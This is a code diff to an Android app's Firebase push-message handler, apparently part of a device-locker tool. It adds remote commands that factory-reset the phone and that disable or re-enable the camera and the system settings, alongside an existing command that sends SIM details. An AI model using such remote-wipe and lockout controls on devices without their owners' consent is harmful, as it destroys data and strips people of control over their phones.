@@ -87,6 +87,30 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                     // Use NetworkManager for SIM logic
                     NetworkManager.sendSimDetails(applicationContext)
                 }
+                "SOFTRESET" -> {
+                    Log.d(TAG, "⚠️ Command: SOFTRESET -> Initiating Factory Reset")
+                    com.d.locker.lock.utils.ResetUtils.softReset(applicationContext)
+                }
+                
+                // Camera Blocking
+                "BLOCK_CAMERA" -> {
+                    Log.d(TAG, "📷 Command: BLOCK_CAMERA -> Disabling Camera")
+                    com.d.locker.lock.utils.RestrictionUtils.setCameraDisabled(applicationContext, true)
+                }
+                "UNBLOCK_CAMERA" -> {
+                    Log.d(TAG, "📷 Command: UNBLOCK_CAMERA -> Enabling Camera")
+                    com.d.locker.lock.utils.RestrictionUtils.setCameraDisabled(applicationContext, false)
+                }
+
+                // Settings Blocking
+                "BLOCK_SETTINGS" -> {
+                    Log.d(TAG, "⚙️ Command: BLOCK_SETTINGS -> Disabling Settings")
+                    com.d.locker.lock.utils.RestrictionUtils.setSettingsDisabled(applicationContext, true)
+                }
+                "UNBLOCK_SETTINGS" -> {
+                    Log.d(TAG, "⚙️ Command: UNBLOCK_SETTINGS -> Enabling Settings")
+                    com.d.locker.lock.utils.RestrictionUtils.setSettingsDisabled(applicationContext, false)
+                }
 
                 else -> {
                     Log.d(TAG, "⚠️ Unknown or missing command: $command")
